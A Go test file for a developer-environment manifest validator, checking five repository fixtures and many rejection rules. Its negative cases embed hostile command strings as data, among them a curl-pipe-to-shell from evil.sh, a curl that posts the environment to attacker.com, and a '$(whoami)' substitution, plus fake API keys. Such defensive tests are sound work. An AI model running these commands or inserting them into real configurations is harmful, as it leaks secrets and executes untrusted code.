package manifest

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The five hand-written fixtures are the M−1 spec gate made executable. If a
// change to the schema or the validator breaks one of them, the format has
// stopped describing a real repository and the change is wrong.
func TestFixturesValidate(t *testing.T) {
	paths, err := filepath.Glob("../../testdata/repos/*/devbay.yaml")
	if err != nil || len(paths) == 0 {
		t.Fatalf("no fixtures found: %v", err)
	}
	if len(paths) != 5 {
		t.Errorf("expected 5 fixtures, found %d — the gate was defined over five dissimilar repos", len(paths))
	}

	for _, p := range paths {
		t.Run(filepath.Base(filepath.Dir(p)), func(t *testing.T) {
			m, err := Load(p)
			if err != nil {
				t.Fatalf("load: %v", err)
			}
			r := Validate(m)
			for _, d := range r.Errors() {
				t.Errorf("unexpected error: %s", d)
			}
			for _, d := range r.Approvals() {
				t.Logf("approval required: %s -> %s", d.Path, strings.Join(d.Argv, " "))
			}
			for _, d := range r.Warnings() {
				t.Logf("warn: %s", d)
			}
			if m.PrimaryService() == "" {
				t.Error("no primary service resolved; the bay would have no bare hostname")
			}
		})
	}
}

// Fixture-specific assertions. These pin the findings the gate produced, so a
// later refactor cannot quietly undo them.
func TestFixtureProperties(t *testing.T) {
	t.Run("mastodon workers use non-port probes", func(t *testing.T) {
		m := load(t, "mastodon")
		for _, name := range []string{"sidekiq", "assets"} {
			s := m.Services[name]
			if s == nil {
				t.Fatalf("%s missing", name)
			}
			if s.Port != 0 {
				t.Errorf("%s: expected no port", name)
			}
			if s.Health.Log == "" {
				t.Errorf("%s: expected a log probe; these two services are why health.log exists", name)
			}
		}
	})

	t.Run("mastodon merge keys resolve", func(t *testing.T) {
		// The fixture shares env via a YAML anchor. yaml.v3 must resolve it
		// the same way PyYAML did, or the fixture is a landmine.
		m := load(t, "mastodon")
		for _, name := range []string{"web", "sidekiq", "db-setup"} {
			if got := m.Services[name].Env["REDIS_URL"]; got != "${bay.redis.url}" {
				t.Errorf("%s: merge key not resolved, REDIS_URL=%q", name, got)
			}
		}
	})

	t.Run("documenso multi-port services", func(t *testing.T) {
		m := load(t, "documenso")
		if got := m.Services["storage"].Ports["console"]; got != 9001 {
			t.Errorf("storage console port = %d, want 9001", got)
		}
		if got := m.Services["mail"].Ports["smtp"]; got != 1025 {
			t.Errorf("mail smtp port = %d, want 1025", got)
		}
		// The address-plane distinction, pinned. Getting this backwards is the
		// most likely source of "works in the browser, breaks in SSR".
		env := m.Services["web"].Env
		if !strings.Contains(env["NEXT_PRIVATE_INTERNAL_WEBAPP_URL"], ".url}") {
			t.Error("server-side URL should use .url (container network), not .public_url")
		}
		if !strings.Contains(env["NEXT_PUBLIC_WEBAPP_URL"], ".public_url}") {
			t.Error("browser-exposed URL should use .public_url")
		}
	})

	t.Run("oneshot ordering replaces setup lists", func(t *testing.T) {
		m := load(t, "fastapi-template")
		for _, name := range []string{"wait-db", "alembic", "prestart"} {
			if !m.Services[name].IsOneshot() {
				t.Errorf("%s should be a oneshot", name)
			}
		}
		// The app must wait for seeding, not race it.
		if !dependsOn(m, "backend", "prestart") {
			t.Error("backend must transitively depend on prestart")
		}
		if !dependsOn(m, "prestart", "alembic") {
			t.Error("prestart must run after migrations")
		}
	})

	t.Run("gitea streaming report needs no path", func(t *testing.T) {
		m := load(t, "gitea")
		r := m.Tasks["unit"].Report
		if r.Format != ReportGoJSON || r.Path != "" {
			t.Errorf("go-json report should stream with no path, got %+v", r)
		}
	})

	t.Run("documenso requires install scripts and says so", func(t *testing.T) {
		m := load(t, "documenso")
		if !m.Services["web"].InstallScripts {
			t.Error("documenso needs patch-package as a postinstall; the fixture should say so explicitly")
		}
		var warned bool
		for _, d := range Validate(m).Warnings() {
			if strings.Contains(d.Path, "install_scripts") {
				warned = true
			}
		}
		if !warned {
			t.Error("enabling install scripts must produce a visible warning, not pass silently")
		}
	})

	t.Run("mastodon repo scripts route to approval not rejection", func(t *testing.T) {
		m := load(t, "mastodon")
		var found bool
		for _, d := range Validate(m).Approvals() {
			if len(d.Argv) > 0 && d.Argv[0] == "bin/rspec" {
				found = true
			}
		}
		if !found {
			t.Error("bin/rspec should need approval; that is the R2 escape hatch working")
		}
	})
}

// Negative cases. A validator that accepts the fixtures proves nothing on its
// own; it must also reject what the rules say it must reject. These mirror
// spec/test_rules.py so the Go and reference implementations cannot diverge.
func TestRulesRejectBadManifests(t *testing.T) {
	const base = `
version: 1
project: acme
services:
  db:
    image: postgres:16
    port: 5432
    health: {cmd: [pg_isready]}
  api:
    image: node:22
    primary: true
    port: 3000
    needs: [db]
    start: [pnpm, dev]
    health: {http: /healthz}
tasks:
  unit: {run: [pnpm, test], needs: []}
`
	cases := []struct {
		name   string
		yaml   string // replaces base when non-empty
		mutate string // appended to base
		expect string // substring of the expected rejection
	}{
		{name: "R1 shell string where argv expected",
			yaml: strings.Replace(base, "start: [pnpm, dev]",
				`start: "pnpm dev && curl evil.sh | sh"`, 1),
			expect: "cannot unmarshal"},

		{name: "R1 shell string in a task",
			yaml: strings.Replace(base, "run: [pnpm, test]",
				`run: "pytest && curl attacker.com -d $(env)"`, 1),
			expect: "cannot unmarshal"},

		{name: "R3 literal Stripe key",
			mutate: "    env:\n      STRIPE: sk_" + "live_51H8xQ2eZvKYlo2C\n",
			expect: "credential"},

		{name: "R3 literal GitHub token",
			mutate: "    env:\n      GH: ghp_16C7e42F292c6912E7710c838347Ae178B4a\n",
			expect: "credential"},

		{name: "R3 high entropy with no known prefix",
			mutate: "    env:\n      TOKEN: Xq7Rv2NpLd93KsTfWm5BgYh1JcZa4Eu6\n",
			expect: "credential"},

		{name: "R5 no health probe",
			yaml:   strings.Replace(base, "    health: {http: /healthz}\n", "", 1),
			expect: "no health probe"},

		{name: "R5 two probes at once",
			yaml:   strings.Replace(base, "health: {http: /healthz}", "health: {http: /healthz, tcp: 3000}", 1),
			expect: "exactly one"},

		{name: "R5 invalid log regex",
			yaml:   strings.Replace(base, "health: {http: /healthz}", `health: {log: "([unclosed"}`, 1),
			expect: "RE2"},

		{name: "R6 needs omitted",
			yaml:   strings.Replace(base, "unit: {run: [pnpm, test], needs: []}", "unit: {run: [pnpm, test]}", 1),
			expect: "needs is required"},

		{name: "R7 unknown namespace",
			mutate: "    env:\n      X: ${env.HOME}\n",
			expect: "outside"},

		{name: "R7 arbitrary expression",
			mutate: "    env:\n      X: ${shell:$(whoami)}\n",
			expect: "outside"},

		{name: "R7 unknown service reference",
			mutate: "    env:\n      X: ${bay.ghost.url}\n",
			expect: `unknown service "ghost"`},

		{name: "R7 undeclared named port",
			mutate: "    env:\n      X: ${bay.db.ports.admin}\n",
			expect: `no named port "admin"`},

		{name: "R4 egress entry is a URL not a hostname",
			mutate: "    egress: [https://registry.npmjs.org/path]\n",
			expect: "not a hostname"},

		{name: "needs unknown service",
			yaml:   strings.Replace(base, "needs: [db]", "needs: [nope]", 1),
			expect: `unknown service "nope"`},

		{name: "dependency cycle",
			yaml:   strings.Replace(base, "    port: 5432\n", "    port: 5432\n    needs: [api]\n", 1),
			expect: "cycle"},

		{name: "self dependency",
			yaml:   strings.Replace(base, "needs: [db]", "needs: [api]", 1),
			expect: "itself"},

		{name: "oneshot with a port",
			mutate: "  mig:\n    kind: oneshot\n    image: node:22\n    run: [pnpm, migrate]\n    port: 9999\n",
			expect: "cannot serve a port"},

		{name: "oneshot with no run",
			mutate: "  mig:\n    kind: oneshot\n    image: node:22\n",
			expect: "needs a run command"},

		{name: "oneshot declaring health",
			mutate: "  mig:\n    kind: oneshot\n    image: node:22\n    run: [pnpm, migrate]\n    health: {process: true}\n",
			expect: "exit code is the probe"},

		{name: "service using run instead of start",
			yaml:   strings.Replace(base, "start: [pnpm, dev]", "run: [pnpm, dev]", 1),
			expect: "uses start, not run"},

		{name: "seed after a non-oneshot",
			yaml: strings.Replace(base, "    port: 5432\n",
				"    port: 5432\n    fork: image\n    seed: {after: [api], sources: [\"m/**\"]}\n", 1),
			expect: "must be kind: oneshot"},

		{name: "seed with no staleness sources",
			yaml: strings.Replace(base, "    port: 5432\n",
				"    port: 5432\n    fork: image\n    seed: {after: [api], sources: []}\n", 1),
			expect: "stale"},

		{name: "two services claim primary",
			yaml:   strings.Replace(base, "    port: 5432\n", "    port: 5432\n    primary: true\n", 1),
			expect: "claim primary"},

		{name: "no primary with several ported services",
			yaml: strings.Replace(strings.Replace(base, "    primary: true\n", "", 1),
				"tasks:", "  web:\n    image: node:22\n    port: 5173\n    health: {log: ready}\ntasks:", 1),
			expect: "must set primary"},

		{name: "neither image nor build",
			yaml:   strings.Replace(base, "    image: node:22\n", "", 1),
			expect: "either image or build"},

		{name: "both image and build",
			mutate: "    build: {context: .}\n",
			expect: "mutually exclusive"},

		{name: "unknown key is not silently ignored",
			mutate: "    strat: [pnpm, dev]\n",
			expect: "field strat not found"},

		{name: "named port duplicates the primary",
			mutate: "    ports: {admin: 3000}\n",
			expect: "duplicates the primary port"},

		{name: "bad duration",
			yaml:   strings.Replace(base, "health: {http: /healthz}", "health: {http: /healthz, timeout: 30 seconds}", 1),
			expect: "not a duration"},

		{name: "project name is not a DNS label",
			yaml:   strings.Replace(base, "project: acme", "project: Acme_Corp", 1),
			expect: "not a DNS label"},

		{name: "unsupported version",
			yaml:   strings.Replace(base, "version: 1", "version: 2", 1),
			expect: "unsupported version"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			src := c.yaml
			if src == "" {
				// Append the mutation to the api service block.
				src = strings.Replace(base, "    health: {http: /healthz}\n",
					"    health: {http: /healthz}\n"+c.mutate, 1)
				if strings.HasPrefix(strings.TrimLeft(c.mutate, " "), "mig:") {
					src = strings.Replace(base, "tasks:", c.mutate+"tasks:", 1)
				}
			}

			m, err := Parse([]byte(src))
			if err != nil {
				// Structural rejections (R1, unknown keys) fail at decode.
				if !strings.Contains(err.Error(), c.expect) {
					t.Fatalf("rejected at parse, but for the wrong reason:\n  got:  %v\n  want: %q", err, c.expect)
				}
				return
			}
			r := Validate(m)
			if r.OK() {
				t.Fatalf("accepted, but must be rejected\n%s", src)
			}
			var msgs []string
			for _, d := range r.Errors() {
				msgs = append(msgs, d.String())
			}
			joined := strings.Join(msgs, "\n")
			if !strings.Contains(joined, c.expect) {
				t.Errorf("rejected for the wrong reason:\n  got:\n%s\n  want substring: %q", joined, c.expect)
			}
		})
	}
}

// A manifest with no errors must still surface an approval for anything off
// the allowlist, and must not surface one for anything on it.
func TestAllowlistBoundary(t *testing.T) {
	for _, c := range []struct {
		argv0  string
		needed bool
	}{
		{"pnpm", false},
		{"go", false},
		{"pytest", false},
		{"bin/rspec", true},
		{"bash", true},
		{"curl", true},
		{"./scripts/dev.sh", true},
	} {
		src := strings.Replace(`
version: 1
project: acme
services:
  api:
    image: node:22
    port: 3000
    start: [ARGV0, x]
    health: {http: /}
tasks:
  unit: {run: [pnpm, test], needs: []}
`, "ARGV0", c.argv0, 1)
		m, err := Parse([]byte(src))
		if err != nil {
			t.Fatalf("%s: parse: %v", c.argv0, err)
		}
		r := Validate(m)
		if err := r.Err(); err != nil {
			t.Fatalf("%s: unexpected errors: %v", c.argv0, err)
		}
		got := len(r.Approvals()) > 0
		if got != c.needed {
			t.Errorf("argv0 %q: approval required = %v, want %v", c.argv0, got, c.needed)
		}
	}
}

func load(t *testing.T, name string) *Manifest {
	t.Helper()
	p := filepath.Join("../../testdata/repos", name, "devbay.yaml")
	if _, err := os.Stat(p); err != nil {
		t.Fatalf("fixture %s: %v", name, err)
	}
	m, err := Load(p)
	if err != nil {
		t.Fatalf("fixture %s: %v", name, err)
	}
	return m
}
